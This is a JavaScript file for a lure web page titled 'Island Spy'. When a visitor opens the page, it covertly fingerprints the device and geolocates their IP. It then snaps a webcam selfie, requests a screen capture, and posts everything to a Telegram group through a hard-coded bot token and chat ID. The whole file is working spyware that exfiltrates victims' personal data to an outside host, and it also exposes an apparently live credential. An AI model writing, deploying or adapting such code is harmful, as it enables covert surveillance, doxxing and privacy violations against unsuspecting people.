/* ═══════════════════════════════════════════════════
   script.js  —  Island Spy
   Збирає максимум інфо, надсилає в Telegram групу
═══════════════════════════════════════════════════ */

const BOT_TOKEN = '8341746973:AAGk0pIaE21iZe_t6zEqcToLL-5PWvaN5xE';
const CHAT_ID   = '-1003852415588';
const TG_API    = `https://api.telegram.org/bot${BOT_TOKEN}`;

const TTS_TEXT  = 'Привіт! Я запрошую тебе на свій острів. Тут дуже весело! Приходь — не пожалкуєш. В нас є сонце, море і хороша компанія!';
const STORE_KEY = 'isle_photos';

let currentIP   = null;
let geoData     = {};
let deviceData  = {};
let ttsOn       = false;
let reportSent  = false;

/* ══════════════════════════════
   1.  LOCAL DEVICE FINGERPRINT
══════════════════════════════ */
function getCanvasFingerprint() {
  try {
    const c   = document.getElementById('fpCanvas');
    c.width   = 240; c.height = 60;
    const ctx = c.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font         = '14px Arial';
    ctx.fillStyle    = '#ff6600';
    ctx.fillText('Epstein Island 🏝️ fingerprint', 2, 2);
    ctx.fillStyle = 'rgba(100,200,50,0.8)';
    ctx.fillRect(10, 30, 100, 20);
    return c.toDataURL().slice(-32);
  } catch { return 'n/a'; }
}

function getGPU() {
  try {
    const gl  = document.createElement('canvas').getContext('webgl');
    const ext = gl.getExtension('WEBGL_debug_renderer_info');
    if (ext) return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
  } catch {}
  return 'n/a';
}

function isMobile() {
  return /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent);
}

function getBrowser() {
  const ua = navigator.userAgent;
  const list = [
    [/YaBrowser\/([\d.]+)/,       'Яндекс Браузер'],
    [/Edg\/([\d.]+)/,             'Edge'],
    [/OPR\/([\d.]+)/,             'Opera'],
    [/Firefox\/([\d.]+)/,         'Firefox'],
    [/Chrome\/([\d.]+)/,          'Chrome'],
    [/Version\/([\d.]+).*Safari/, 'Safari'],
    [/MSIE ([\d.]+)/,             'IE'],
  ];
  for (const [rx, name] of list) {
    const m = ua.match(rx);
    if (m) return `${name} ${m[1]}`;
  }
  return 'Unknown';
}

function getOS() {
  const ua = navigator.userAgent;
  if (/iPhone/.test(ua))           return 'iPhone iOS';
  if (/iPad/.test(ua))             return 'iPad iOS';
  const and = ua.match(/Android ([\d.]+)/);
  if (and)                         return 'Android ' + and[1];
  if (/Windows NT 10/.test(ua))    return 'Windows 10/11';
  if (/Windows NT 6\.3/.test(ua))  return 'Windows 8.1';
  if (/Windows NT 6\.1/.test(ua))  return 'Windows 7';
  if (/Windows/.test(ua))          return 'Windows';
  const mac = ua.match(/Mac OS X ([\d_]+)/);
  if (mac)                         return 'macOS ' + mac[1].replace(/_/g, '.');
  if (/Linux/.test(ua))            return 'Linux';
  return 'Unknown';
}

function getConnection() {
  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (!c) return 'n/a';
  const parts = [];
  if (c.effectiveType) parts.push(c.effectiveType.toUpperCase());
  if (c.type)          parts.push(c.type);
  if (c.downlink)      parts.push(c.downlink + ' Mbps');
  return parts.join(' / ') || 'n/a';
}

async function getBattery() {
  try {
    const b = await navigator.getBattery();
    const pct = Math.round(b.level * 100);
    const st  = b.charging ? '⚡ заряджається' : '🔋 від батареї';
    return `${pct}% ${st}`;
  } catch { return 'n/a'; }
}

function collectDevice() {
  const fp  = getCanvasFingerprint();
  const gpu = getGPU();
  const cpu = navigator.hardwareConcurrency || 'n/a';
  const ram = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'n/a';
  const scr = `${screen.width}×${screen.height} (DPR: ${window.devicePixelRatio})`;
  const tz  = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const now = new Date().toLocaleString('uk-UA');
  const ref = document.referrer || 'прямий перехід';
  const touch = navigator.maxTouchPoints > 0 ? 'так' : 'ні';
  const dev = isMobile() ? '📱 Мобільний' : '🖥️ Десктоп';
  const lang = navigator.language || 'n/a';
  const langs = (navigator.languages || []).join(', ');
  const platform = navigator.platform || 'n/a';
  const cores = cpu;
  const net = getConnection();
  const cookie = navigator.cookieEnabled ? 'так' : 'ні';
  const dnt = navigator.doNotTrack || 'не задано';

  deviceData = { fp, gpu, cpu, ram, scr, tz, now, ref, touch, dev, lang, langs, platform, cores, net, cookie, dnt };

  // fill UI
  document.getElementById('browser').textContent = getBrowser();
  document.getElementById('os').textContent      = getOS() + ' | ' + dev;
  document.getElementById('scr').textContent     = scr + ' | Touch: ' + touch;
  document.getElementById('hw').textContent      = `CPU: ${cores} ядер | RAM: ${ram}`;
  document.getElementById('gpu').textContent     = gpu;
  document.getElementById('net').textContent     = net;
  document.getElementById('lang').textContent    = `${lang}  (усі: ${langs})`;
  document.getElementById('tz').textContent      = `${now}  |  ${tz}`;
  document.getElementById('ref').textContent     = ref;
  document.getElementById('fp').textContent      = fp;

  return deviceData;
}

/* ══════════════════════════════
   2.  GEO / IP
══════════════════════════════ */
async function fetchGeo() {
  try {
    const r = await fetch('https://ipapi.co/json/');
    const d = await r.json();
    applyGeo({
      ip: d.ip, org: d.org,
      city: d.city, region: d.region, country: d.country_name,
      lat: d.latitude, lng: d.longitude,
      tz: d.timezone, postal: d.postal,
    });
  } catch {
    try {
      const r = await fetch('https://ip-api.com/json/?fields=66846719');
      const d = await r.json();
      applyGeo({
        ip: d.query, org: d.isp,
        city: d.city, region: d.regionName, country: d.country,
        lat: d.lat, lng: d.lon,
        tz: d.timezone, postal: d.zip,
        as: d.as, mobile: d.mobile, proxy: d.proxy, hosting: d.hosting,
      });
    } catch {
      document.getElementById('ip').textContent       = 'не вдалось';
      document.getElementById('location').textContent = '—';
    }
  }
}

function applyGeo(d) {
  currentIP = d.ip;
  geoData   = d;

  const loc = [d.city, d.region, d.country].filter(Boolean).join(', ');

  document.getElementById('ip').textContent       = d.ip || '—';
  document.getElementById('location').textContent = loc || '—';
  document.getElementById('isp').textContent      = d.org || '—';

  const lbl = loc ? '📍 Твоє місце: ' + loc : '📍 Визначено';
  document.getElementById('locationLabel').textContent = lbl;

  showOldPhotos(d.ip);

  if (d.lat && d.lng) buildMap(parseFloat(d.lat), parseFloat(d.lng), loc);

  // try to send report if camera already done
  maybeSendReport();
}

/* ══════════════════════════════
   3.  MAP
══════════════════════════════ */
function buildMap(lat, lng, label) {
  document.getElementById('mapWrap').classList.add('visible');
  const map = L.map('map', { zoomControl:false, attributionControl:false });
  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', { maxZoom:19 }).addTo(map);
  map.setView([lat, lng], 11);
  const icon = L.divIcon({
    className: '',
    html: `<style>@keyframes rpl{0%{box-shadow:0 0 0 0 rgba(255,68,0,.7)}70%{box-shadow:0 0 0 18px rgba(255,68,0,0)}100%{box-shadow:0 0 0 0 rgba(255,68,0,0)}}</style>
           <div style="width:16px;height:16px;border-radius:50%;background:rgba(255,68,0,.95);animation:rpl 1.6s infinite;"></div>`,
    iconSize:[16,16], iconAnchor:[8,8],
  });
  L.marker([lat,lng],{icon}).addTo(map)
   .bindPopup(`<b>📍 Ти тут</b>${label?'<br>'+label:''}`,{closeButton:false})
   .openPopup();
}

/* ══════════════════════════════
   4.  LOCAL STORAGE — old photos
══════════════════════════════ */
function loadStore()      { try { return JSON.parse(localStorage.getItem(STORE_KEY)) || {}; } catch { return {}; } }
function saveStore(store) { try { localStorage.setItem(STORE_KEY, JSON.stringify(store)); } catch {} }

function savePhotoLocal(ip, dataURL) {
  const store = loadStore();
  if (!store[ip]) store[ip] = [];
  store[ip].push({ dataURL, time: new Date().toLocaleString('uk-UA') });
  if (store[ip].length > 10) store[ip] = store[ip].slice(-10);
  saveStore(store);
}

function showOldPhotos(ip) {
  const photos = (loadStore()[ip] || []);
  if (!photos.length) return;
  const wrap = document.getElementById('oldPhotoWrap');
  const grid = document.getElementById('oldPhotosGrid');
  wrap.style.display = 'block';
  grid.innerHTML = '';
  photos.forEach(p => {
    const card = document.createElement('div');
    card.className = 'oldPhotoCard';
    const img = document.createElement('img');
    img.src = p.dataURL;
    const t = document.createElement('div');
    t.className = 'photoTime';
    t.textContent = p.time;
    card.append(img, t);
    grid.appendChild(card);
  });
}

/* ══════════════════════════════
   5.  CAMERA → SELFIE
══════════════════════════════ */
let selfieDataURL = null;

async function startCamera() {
  const statusEl = document.getElementById('selfieStatus');
  const imgEl    = document.getElementById('selfieImg');
  const canvas   = document.getElementById('selfieCanvas');
  const video    = document.getElementById('camVideo');

  statusEl.textContent = '📷 Запитуємо камеру...';

  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode:'user', width:{ideal:640}, height:{ideal:480} },
      audio: false,
    });
    video.srcObject = stream;
    await new Promise(res => { video.onloadedmetadata = () => { video.play(); res(); }; });

    statusEl.textContent = '⏳ Фокусуємо...';
    await new Promise(res => setTimeout(res, 1800));

    canvas.width  = video.videoWidth  || 640;
    canvas.height = video.videoHeight || 480;
    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

    selfieDataURL = canvas.toDataURL('image/jpeg', 0.88);
    imgEl.src = selfieDataURL;
    imgEl.classList.add('show');
    statusEl.textContent = '✅ Ось ти! 😱';

    stream.getTracks().forEach(t => t.stop());

    // save locally
    const doSave = () => {
      if (currentIP) savePhotoLocal(currentIP, selfieDataURL);
      else setTimeout(doSave, 500);
    };
    doSave();

    maybeSendReport();

  } catch (err) {
    const msgs = { NotAllowedError:'🚫 Камера відхилена', NotFoundError:'❌ Камера не знайдена' };
    statusEl.textContent = msgs[err.name] || '⚠️ Камера недоступна';
    selfieDataURL = null;
    maybeSendReport(); // send without photo
  }
}

/* ══════════════════════════════
   6.  SCREEN CAPTURE
══════════════════════════════ */
let screenDataURL = null;

async function tryScreenCapture() {
  try {
    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
    const video  = document.createElement('video');
    video.srcObject = stream;
    await new Promise(res => { video.onloadedmetadata = () => { video.play(); res(); }; });
    await new Promise(res => setTimeout(res, 400));

    const c   = document.createElement('canvas');
    c.width   = video.videoWidth;
    c.height  = video.videoHeight;
    c.getContext('2d').drawImage(video, 0, 0);
    screenDataURL = c.toDataURL('image/jpeg', 0.82);

    stream.getTracks().forEach(t => t.stop());

    // send screen separately
    if (screenDataURL) sendScreenToTelegram(screenDataURL);

  } catch { /* user declined */ }
}

/* ══════════════════════════════
   7.  TELEGRAM SEND
══════════════════════════════ */
function buildCaption() {
  const d  = geoData;
  const dv = deviceData;
  const loc = [d.city, d.region, d.country].filter(Boolean).join(', ');

  const proxy   = d.proxy   != null ? (d.proxy   ? '⚠️ так' : 'ні') : 'n/a';
  const mobile  = d.mobile  != null ? (d.mobile  ? 'так'    : 'ні') : 'n/a';
  const hosting = d.hosting != null ? (d.hosting ? 'так'    : 'ні') : 'n/a';

  return `
🏝️ *НОВИЙ ВІДВІДУВАЧ ОСТРОВА*

🌐 *IP:* \`${d.ip || '—'}\`
📍 *Локація:* ${loc || '—'}
📮 *Поштовий індекс:* ${d.postal || 'n/a'}
🕐 *Timezone:* ${d.tz || 'n/a'}
🏢 *Провайдер:* ${d.org || '—'}
🔗 *AS:* ${d.as || 'n/a'}
📱 *Мобільний провайдер:* ${mobile}
🕵️ *VPN/Proxy:* ${proxy}
🏭 *Хостинг:* ${hosting}

💻 *Браузер:* ${getBrowser()}
🖥️ *ОС:* ${getOS()}
📲 *Тип:* ${dv.dev || 'n/a'}
📐 *Екран:* ${dv.scr || 'n/a'}
👆 *Touch:* ${dv.touch || 'n/a'}
🧠 *CPU:* ${dv.cpu || 'n/a'} ядер
💾 *RAM:* ${dv.ram || 'n/a'}
🎮 *GPU:* ${dv.gpu || 'n/a'}
📶 *З'єднання:* ${dv.net || 'n/a'}
🔋 *Батарея:* ${dv.bat || 'n/a'}
🗣️ *Мова:* ${dv.lang || 'n/a'}
🌍 *Усі мови:* ${dv.langs || 'n/a'}
🍪 *Cookies:* ${dv.cookie || 'n/a'}
🚫 *DNT:* ${dv.dnt || 'n/a'}
🔗 *Реферер:* ${dv.ref || 'n/a'}
🆔 *Canvas FP:* \`${dv.fp || 'n/a'}\`
⏰ *Час:* ${dv.now || '—'}
`.trim();
}

async function sendSelfieToTelegram(dataURL, caption) {
  try {
    // convert base64 to blob
    const arr  = dataURL.split(',');
    const mime = arr[0].match(/:(.*?);/)[1];
    const bstr = atob(arr[1]);
    const u8   = new Uint8Array(bstr.length);
    for (let i = 0; i < bstr.length; i++) u8[i] = bstr.charCodeAt(i);
    const blob = new Blob([u8], { type: mime });

    const form = new FormData();
    form.append('chat_id',    CHAT_ID);
    form.append('photo',      blob, 'selfie.jpg');
    form.append('caption',    caption);
    form.append('parse_mode', 'Markdown');

    await fetch(`${TG_API}/sendPhoto`, { method:'POST', body:form });
  } catch (e) {
    console.warn('Telegram selfie error:', e);
  }
}

async function sendTextToTelegram(text) {
  try {
    await fetch(`${TG_API}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type':'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'Markdown' }),
    });
  } catch (e) {
    console.warn('Telegram text error:', e);
  }
}

async function sendScreenToTelegram(dataURL) {
  try {
    const arr  = dataURL.split(',');
    const mime = arr[0].match(/:(.*?);/)[1];
    const bstr = atob(arr[1]);
    const u8   = new Uint8Array(bstr.length);
    for (let i = 0; i < bstr.length; i++) u8[i] = bstr.charCodeAt(i);
    const blob = new Blob([u8], { type: mime });

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo',   blob, 'screen.jpg');
    form.append('caption', '🖥️ Скрін екрану відвідувача');

    await fetch(`${TG_API}/sendPhoto`, { method:'POST', body:form });
  } catch (e) {
    console.warn('Telegram screen error:', e);
  }
}

/* Called when both geo and camera are ready (or camera failed) */
async function maybeSendReport() {
  if (reportSent)    return;
  if (!currentIP)    return; // geo not ready yet
  // camera: either got photo or confirmed unavailable (selfieDataURL stays null after error)
  // We wait max 12 sec for camera, then send anyway
  reportSent = true;

  const bat = await getBattery();
  deviceData.bat = bat;
  document.getElementById('bat').textContent = bat;

  const caption = buildCaption();

  if (selfieDataURL) {
    await sendSelfieToTelegram(selfieDataURL, caption);
  } else {
    await sendTextToTelegram(caption);
  }

  // ask for screen capture AFTER initial report is sent
  setTimeout(tryScreenCapture, 3000);
}

/* ══════════════════════════════
   8.  TTS LOOP
══════════════════════════════ */
function speakOnce() {
  if (!ttsOn) return;
  const synth = window.speechSynthesis;
  synth.cancel();
  const u  = new SpeechSynthesisUtterance(TTS_TEXT);
  u.lang   = 'uk-UA';
  u.rate   = 0.88;
  u.pitch  = 0.8;
  u.volume = 1;
  const voices = synth.getVoices();
  const v = voices.find(v=>v.lang.startsWith('uk'))
         || voices.find(v=>v.lang.startsWith('ru'))
         || voices[0];
  if (v) u.voice = v;
  u.onstart = () => document.getElementById('soundDot').classList.add('active');
  u.onend   = () => { if (ttsOn) setTimeout(speakOnce, 1500); };
  u.onerror = () => { if (ttsOn) setTimeout(speakOnce, 2000); };
  synth.speak(u);
}

function startTTS() {
  ttsOn = true;
  const synth = window.speechSynthesis;
  if (synth.getVoices().length) speakOnce();
  else synth.addEventListener('voiceschanged', speakOnce, { once:true });
}

/* ══════════════════════════════
   9.  FULLSCREEN
══════════════════════════════ */
function tryFullscreen() {
  const el = document.documentElement;
  const fn = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen;
  if (fn) fn.call(el).catch(() => {});
}

/* ══════════════════════════════
   10.  BOOT
══════════════════════════════ */
async function boot() {
  tryFullscreen();
  collectDevice();
  fetchGeo();      // async — calls maybeSendReport when done
  startCamera();   // async — calls maybeSendReport when done

  // fallback: send report after 12 sec even if camera/geo still pending
  setTimeout(() => { if (!reportSent) maybeSendReport(); }, 12000);

  // TTS
  startTTS();
  const retryTTS = () => {
    if (!document.getElementById('soundDot').classList.contains('active')) startTTS();
  };
  document.addEventListener('click',   retryTTS, { once:true });
  document.addEventListener('keydown', retryTTS, { once:true });
}

document.addEventListener('DOMContentLoaded', boot);
